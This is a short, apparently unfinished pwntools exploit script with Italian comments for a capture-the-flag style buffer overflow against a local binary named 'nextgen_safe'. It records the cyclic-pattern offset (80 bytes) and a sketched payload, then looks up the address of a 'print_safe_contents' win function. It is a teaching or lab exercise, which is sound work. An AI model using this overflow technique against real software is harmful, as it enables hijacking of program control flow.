
from pwn import *

p = process("./nextgen_safe")

#Analisi del formato ELF binario
#Ci permette di estrarre informazioni utili dal binario
p_elf = ELF("./nextgen_safe")

'''
Offset con cyclic

Gereazione Payload:
cyclic -n 4 100

Verificabile con:
gdb, valgrind, strace

Fault Address: 0x61616175

Generazione Offset:
cyclic -n 4 -l 0x61616175
Output: 80

Payload Ipotetico:
'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'+'AAAA'

'AAAA': Puntatore ad un'altra funzione o segmento di memoria eseguibile

'''

flag_function_addr = p_elf.symbols["print_safe_contents"] # Alternativa p_elf.sym["win"]

payload =flag_function_addr
print("normale",payload)
print("normale",p32(payload))